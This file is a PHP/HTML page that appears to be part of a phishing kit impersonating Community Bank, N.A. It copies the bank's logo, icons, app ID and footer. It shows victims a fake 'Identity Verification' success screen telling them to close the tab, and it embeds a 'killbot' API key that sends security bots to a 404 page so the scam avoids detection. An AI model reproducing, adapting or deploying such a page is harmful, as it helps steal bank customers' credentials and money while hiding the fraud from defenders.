<?php
error_reporting(0);
session_start();
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0,user-scale=0">
    <link rel="stylesheet" href="../Styles/index.css">
    <meta name="theme-color" content="#8a132e">
    <link rel="manifest" href="/app-manifest">
    <meta name="apple-itunes-app" content="app-id=1484377074">
    <link rel="apple-touch-icon" href="../Assets/community-bank-na-ios-9a860533.png">
    <link rel="preload" as="image" href="../Assets/community-bank-na-logo-10a12eff.png">
    <link rel="preload" as="image" href="../Assets/community-bank-na-logo-10a12eff.png">
    <link rel="icon" type="image/x-icon" href="../Assets/community-bank-na-favicon-0a4138de.ico">
    <link rel="icon" sizes="192x192" href="../Assets/community-bank-na-android-fc19775a.png">
    <link rel="icon" type="image/x-icon" href="../Assets/washington-trust-bank-favicon.ico"> 
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" integrity="sha512-iecdLmaskl7CVkqkXNQ/ZH/XLlvWZOJyj7Yy7tcenmpD1ypASozpmT/E0iPtmFIB46ZmdtAc9eNBvH0H/ZpiBw==" crossorigin="anonymous" referrerpolicy="no-referrer" />
    <title>Login · Community Bank, N.A. </title>
    <script src="../Functions/script.js"></script>
    <script type="text/javascript">
    const killbot = {
      apiKey: "kDIX0_nmT22fsd2wTR4iEo5hekyfqG-2xNanb-wjYH8lA", 
      botRedirection: "404"
    }
  </script>
    <!-- <script>
        window.addEventListener("load", ()=>{
            const loader = document.querySelector('.loader-div');
            const loginpa = document.querySelector('.login-parent');
            const ErrorMsg = document.querySelector('.error-message');
            setTimeout(()=>{
                loader.style.display="none";
                loginpa.style.opacity ="1";
                ErrorMsg.style.opacity="1";
                
            }, 3000);
        })
    </script> -->
</head>
<body>
    <main class="main">
        <section class="section">
            <div class="image-logo">
                <img src="../Assets/community-bank-na-logo-10a12eff.png" alt="">
            <!-- </div>
            <div class="loader-div"> -->
            </div>
            <div class="error-message" style="background-color: #f2f2f2;">
                <h2>Identity Verification</h2>
                <br>
                <div class="success-message-div">
                    <div class="success-img">
                    <i class="fas fa-check-circle"></i>
                    </div>
                    <div class="success-message">
                    <p>Account verification is completed.</p>
                    <p>Please close tab now.</p>
                    </div>
                </div>
                
                <br>
                  
            </div>
            <div class="login-parent">
                
            </div>
        </section>
        <footer class="footer">
            <ul>
               <li>© 2023 Community Bank, N.A.</li>
                <li>•</li>
                <li><a href="JavaScript:void(0)"> Privacy policy</a></li>
                <li  class="dots">•</li>
                <li>Member FDIC  </li>
                <li>•</li>
                <li><svg width="16" height="11" viewBox="0 0 10 7" class="ehl-icon" aria-hidden="true" style="fill:#7e7e7e" > <path d="M4.96.222L.337 2.588v.962l.511.007v3.448h8.186L9.03 3.55h.55v-.962L4.959.222zm3.163 5.872H1.76V3.028l3.2-1.65 3.163 1.65v3.066zm-4.677-2.26h2.999v-.828H3.446v.828zm0 1.489h2.985v-.828H3.446v.828z"></path> </svg> Equal Housing Lender</li>
            </ul>
        </footer>
    </main>
    
</body>
</html>